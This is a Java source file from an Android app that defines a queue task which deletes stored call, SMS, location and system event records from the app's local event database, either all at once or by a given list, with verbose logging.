package com.fx.eventdb;

import java.util.List;

import android.content.ContentUris;
import android.content.Context;
import android.net.Uri;

import com.fx.event.Event;
import com.fx.maind.ref.Customization;
import com.vvt.logger.FxLog;

public class RemoveEventsQueue extends EventQueue {
	
	private static final String TAG = "RemoveEventsQueue";
	private static final boolean LOGV = Customization.VERBOSE;
	
	private boolean mIsRemoveAllEvents;
	private List<Event> mEventListToProcess;
	
	public RemoveEventsQueue(Context context, Callback callback, List<Event> eventListToProcess) {
		super(context, callback);
		mEventListToProcess = eventListToProcess;
	}
	
	public RemoveEventsQueue(Context context, Callback callback, boolean isRemoveAllEvents) {
		super(context, callback);
		mEventListToProcess = null;
		mIsRemoveAllEvents = isRemoveAllEvents;
	}
	
	public void run() {
		if (mIsRemoveAllEvents) {
			removeAllEvents();
		}
		else if (mEventListToProcess != null){
			removeEventInList();
		}
		
		notifyProcessDone();
	}
	
	private void removeAllEvents() {
		if (LOGV) {
			FxLog.v(TAG, "removeAllEvents # Attempting to remove all events");
		}
		
		int cumulativeDeleteCountInt = 0;
		int deleteCountInt = -1;
		Uri deleteUri = null;
		
		// Delete all call events
		deleteUri = mEventdbManager.getEventUri(Event.TYPE_CALL) ;
		deleteCountInt = mEventdbHelper.delete(deleteUri, null, null);
		if (deleteCountInt > 0) {
			cumulativeDeleteCountInt += deleteCountInt;
		}
		
		// Delete all SMS events
		deleteUri = mEventdbManager.getEventUri(Event.TYPE_SMS) ;
		deleteCountInt = mEventdbHelper.delete(deleteUri, null, null);
		if (deleteCountInt > 0) {
			cumulativeDeleteCountInt += deleteCountInt;
		}
		
		// Delete all location events
		deleteUri = mEventdbManager.getEventUri(Event.TYPE_LOCATION) ;
		deleteCountInt = mEventdbHelper.delete(deleteUri, null, null);
		if (deleteCountInt > 0) {
			cumulativeDeleteCountInt += deleteCountInt;
		}
		
		// Delete all system events
		deleteUri = mEventdbManager.getEventUri(Event.TYPE_SYSTEM) ;
		deleteCountInt = mEventdbHelper.delete(deleteUri, null, null);
		if (deleteCountInt > 0) {
			cumulativeDeleteCountInt += deleteCountInt;
		}
		
		if (LOGV) {
			FxLog.v(TAG, String.format("removeAllEvents # %d events deleted", 
					cumulativeDeleteCountInt));
		}
	}
	
	private void removeEventInList() {
		if (LOGV) {
			FxLog.v(TAG, String.format("removeEventInList # " +
					"[EVENT-DELIVER] Attempting to remove '%d' events", 
					mEventListToProcess.size()));
		}
		
		int cumulativeDeleteCountInt = 0;
		
		for (Event event : mEventListToProcess) {
			
			Uri deleteUri = ContentUris.withAppendedId(
					mEventdbManager.getEventUri(
							event.getType()), event.getRowId()) ;
			
			int deleteCountInt = mEventdbHelper.delete(deleteUri, null, null);
			
			if (deleteCountInt > 0) {
				cumulativeDeleteCountInt += deleteCountInt;
			}
			
			// Print log
			if (LOGV) {
				if (deleteCountInt > 0) {
					FxLog.v(TAG, String.format(
							"removeEventInList # [EVENT-TRACE] Event \"%s\" is removed successfully", 
							event.getShortDescription()));
				} 
				else {
					FxLog.v(TAG, String.format(
							"removeEventInList # [EVENT-TRACE] Event \"%s\" is failed to removed!", 
							event.getShortDescription()));
				}
			}
		}
		
		if (LOGV) {
			FxLog.v(TAG, String.format("removeEventInList # [EVENT-DELIVER] %d events deleted", 
					cumulativeDeleteCountInt));
		}
	}
}
